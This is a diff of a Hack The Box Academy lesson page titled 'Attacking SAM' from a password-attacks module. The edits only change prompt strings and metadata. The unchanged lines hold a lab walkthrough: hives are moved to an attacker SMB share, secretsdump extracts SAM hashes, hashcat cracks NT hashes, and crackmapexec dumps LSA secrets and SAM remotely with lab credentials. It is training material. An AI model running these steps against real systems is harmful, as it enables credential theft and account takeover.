@@ -7,13 +7,15 @@
 // Module Difficulty: Medium
 // Section ID: 1315
 // Section Title: Attacking SAM
-// Page Title: Password Attacks
-// Page Number: 7
+// Page Title: Hack The Box - Academy
+// Page Number: 07
 -->
 
 # Attacking SAM
 
-**Module Name:** Password Attacks **Page Number:** 7
+**Module Name:** Password Attacks **Page Number:** 07
+
+#### 
 
 #### PASSWORD ATTACKS
 
@@ -40,7 +42,7 @@ The operation completed successfully.
 #### Creating a Share with smbserver.py
 
 ``` shell-session
-[!bash!]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
+ndefstathiou@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -68,7 +70,7 @@ C:\> move system.save \\10.10.15.16\CompData
 #### Confirming Hive Copies Transferred to Attack Host
 
 ``` shell-session
-[!bash!]$ ls
+ndefstathiou@htb[/htb]$ ls
 
 sam.save  security.save  system.save
 ```
@@ -78,13 +80,13 @@ sam.save  security.save  system.save
 #### Locating secretsdump.py
 
 ``` shell-session
-[!bash!]$ locate secretsdump
+ndefstathiou@htb[/htb]$ locate secretsdump
 ```
 
 #### Running secretsdump.py
 
 ``` shell-session
-[!bash!]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+ndefstathiou@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
@@ -122,7 +124,7 @@ Dumping local SAM hashes (uid:rid:lmhash:nthash)
 #### Adding nthashes to a .txt File
 
 ``` shell-session
-[!bash!]$ sudo vim hashestocrack.txt
+ndefstathiou@htb[/htb]$ sudo vim hashestocrack.txt
 
 64f12cddaa88057e06a81b54e73b949b
 31d6cfe0d16ae931b73c59d7e0c089c0
@@ -134,7 +136,7 @@ f7eb9c06fafaa23c4bcf22ba6781c1e2
 #### Running Hashcat against NT Hashes
 
 ``` shell-session
-[!bash!]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
+ndefstathiou@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
 
@@ -176,7 +178,7 @@ Stopped: Tue Dec 14 14:16:58 2021
 #### Dumping LSA Secrets Remotely
 
 ``` shell-session
-[!bash!]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
+ndefstathiou@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
 
 SMB         10.129.42.198   445    WS01     [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:FRONTDESK01) (signing:False) (SMBv1:False)
 SMB         10.129.42.198   445    WS01     [+] WS01\bob:HTB_@cademy_stdnt!(Pwn3d!)
@@ -191,7 +193,7 @@ SMB         10.129.42.198   445    WS01     [+] Dumped 3 LSA secrets to /home/bo
 #### Dumping SAM Remotely
 
 ``` shell-session
-[!bash!]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
+ndefstathiou@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
 
 SMB         10.129.42.198   445    WS01      [*] Windows 10.0 Build 18362 x64 (name:FRONTDESK01) (domain:WS01) (signing:False) (SMBv1:False)
 SMB         10.129.42.198   445    WS01      [+] FRONTDESK01\bob:HTB_@cademy_stdnt! (Pwn3d!)
